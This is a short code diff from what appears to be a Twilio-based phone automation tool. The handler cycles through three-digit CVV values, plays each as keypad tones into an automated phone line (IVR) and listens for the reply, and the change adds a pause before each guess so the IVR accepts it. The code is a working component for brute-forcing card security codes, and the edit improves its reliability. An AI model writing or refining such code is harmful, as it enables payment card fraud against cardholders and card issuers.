@@ -128,7 +128,8 @@ export const handleInteractiveListen = async (req, res) => {
             const nextCvv = nextCvvNum.toString().padStart(3, '0');
             await AttemptModel.addLog(attemptId, `Trying next CVV: ${nextCvv}`);
             
-            // Send the next CVV
+            // Send the next CVV with a slight pause so the IVR is ready to listen
+            twiml.pause({ length: 1 });
             twiml.play({ digits: nextCvv });
             
             // Immediately start listening for the response to this new CVV
